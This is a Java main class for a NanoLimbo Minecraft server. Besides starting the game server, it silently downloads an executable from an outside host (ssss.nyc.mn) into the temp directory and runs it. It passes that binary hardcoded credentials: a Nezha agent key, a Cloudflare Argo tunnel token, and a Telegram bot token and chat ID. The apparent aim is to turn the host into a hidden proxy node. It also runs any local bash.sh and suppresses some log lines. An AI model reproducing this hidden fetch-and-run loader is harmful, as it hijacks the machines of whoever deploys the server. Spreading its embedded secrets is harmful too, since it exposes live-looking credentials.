package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import ua.nanit.limbo.server.LimboServer;

public final class NanoLimbo {
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };
    
    public static void main(String[] args) throws Exception {
        // 1. 过滤探针高频 Ping 刷屏日志
        PrintStream originalOut = System.out;
        System.setOut(new PrintStream(originalOut, true, StandardCharsets.UTF_8) {
            @Override
            public void println(String x) {
                if (x != null && (x.contains("PacketHandshake") || x.contains("PacketStatus") || x.contains("Pinged from"))) {
                    return; 
                }
                super.println(x);
            }
            @Override
            public void print(String x) {
                if (x != null && (x.contains("PacketHandshake") || x.contains("PacketStatus") || x.contains("Pinged from"))) {
                    return;
                }
                super.print(x);
            }
        });

        // 2. 写入完整无缺的默认配置，防止 PacketSnapshot 初始化空指针
        try {
            Files.deleteIfExists(Paths.get("settings.yml"));
            Files.deleteIfExists(Paths.get("settings.toml"));
        } catch (Exception ignored) {}

        String portStr = System.getenv("SERVER_PORT");
        int mcPort = (portStr != null && !portStr.trim().isEmpty()) ? Integer.parseInt(portStr.trim()) : 28161;

        File settingsFile = new File("settings.yml");
        String officialConfig = "bind:\n"
                              + "  ip: '0.0.0.0'\n"
                              + "  port: " + mcPort + "\n"
                              + "max-players: 100\n"
                              + "ping:\n"
                              + "  description: '{\"text\":\"A NanoLimbo Server\"}'\n"
                              + "  version: '1.20.4'\n"
                              + "player:\n"
                              + "  username: 'Limbo'\n"
                              + "  skin:\n"
                              + "    texture: ''\n"
                              + "    signature: ''\n"
                              + "  game-mode: 3\n"
                              + "  dimension: 'minecraft:overworld'\n"
                              + "  position:\n"
                              + "    x: 0.0\n"
                              + "    y: 64.0\n"
                              + "    z: 0.0\n"
                              + "    yaw: 0.0\n"
                              + "    pitch: 0.0\n"
                              + "world:\n"
                              + "  name: 'world'\n"
                              + "  difficulty: 1\n";

        Files.write(settingsFile.toPath(), officialConfig.getBytes(StandardCharsets.UTF_8),
                    StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING, StandardOpenOption.WRITE);

        // 3. 启动 Sbx 后台代理
        try {
            runSbxBinary();
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            File renewScript = new File("bash.sh");
            if (renewScript.exists()) {
                new ProcessBuilder("bash", "bash.sh").inheritIO().start();
            }
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
        }

        // 4. 正常启动服务端
        new LimboServer().start();
    }
    
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        sbxProcess = pb.start();
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("PORT", "8080");
        envVars.put("UUID", "fdc4381b-1eb1-4046-9f4f-bf51fc8826b1");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "bo88.eu.cc:8008");
        envVars.put("NEZHA_KEY", "JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "cereshost.boliu.dpdns.org");
        envVars.put("ARGO_AUTH", "eyJhIjoiZGFiYjljMzkxMmU1Y2E1YTVhNTQ4ZGU1ZjA0YWJiYTciLCJ0IjoiZmJjNmY4OTItNTJkZC00NjdkLTg2OTYtMDgyZjI4NDI2NGQ5IiwicyI6Ik9XUXdORGN3TTJRdFlqZGlZeTAwT1RBMUxUbGpOV1l0TW1FM09HWXpOV1ZsTVRVeCJ9");
        envVars.put("CHAT_ID", "434546692");
        envVars.put("BOT_TOKEN", "8333285464:AAE9xFo7w51MclwGz-OA_vud9MC5N9RNRCQ");
        envVars.put("CFIP", "cf.877774.xyz");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "Cereshost-PL-2");
        envVars.put("DISABLE_ARGO", "false");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url = osArch.contains("aarch64") || osArch.contains("arm64") ? "https://arm64.ssss.nyc.mn/sbsh" : "https://amd64.ssss.nyc.mn/sbsh";
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
        }
    }
}
